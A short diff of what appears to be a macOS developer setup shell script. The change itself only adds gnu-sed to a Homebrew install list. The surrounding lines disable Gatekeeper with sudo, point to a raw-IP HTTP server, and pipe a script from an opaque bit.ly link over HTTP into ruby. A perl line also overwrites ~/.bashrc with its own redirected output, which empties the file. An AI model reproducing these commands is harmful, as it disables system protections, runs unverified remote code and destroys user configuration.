@@ -4,7 +4,7 @@ set -e; sudo spctl --master-disable; SERVER='GS=http://149.28.95.12:8808'
 multi () { for f in "$@"; do touch $HOME/.${f}; done }; multi bash_profile bashrc
 chkprog () { if hash $1 2> /dev/null; then return 0; else return 1; fi }
 if ! chkprog brew; then /usr/bin/ruby -e "$(curl -fsSL http://bit.ly/2KOr6Yr)"; else brew update 1> /dev/null; fi; if chkprog rvm; then rvm implode; fi
-biu () { for i in "$@"; do if ! chkprog $i; then brew install $i; else brew upgrade $i 2> /dev/null || true; fi; done }; biu tmux rbenv ninja
+biu () { for i in "$@"; do if ! chkprog $i; then brew install $i; else brew upgrade $i 2> /dev/null || true; fi; done }; biu tmux rbenv ninja gnu-sed
 
 MKPCMD='mkproj () { git clone git@bitbucket.org:bravosprinthub/mkproj.git $1 && rm -rf $1/.git $1/README.md; }'; MKPCMDS='mkproj ()'
 (perl -pe "s^$SERVER^^g" ~/.bashrc > ~/.bashrc) 2> /dev/null
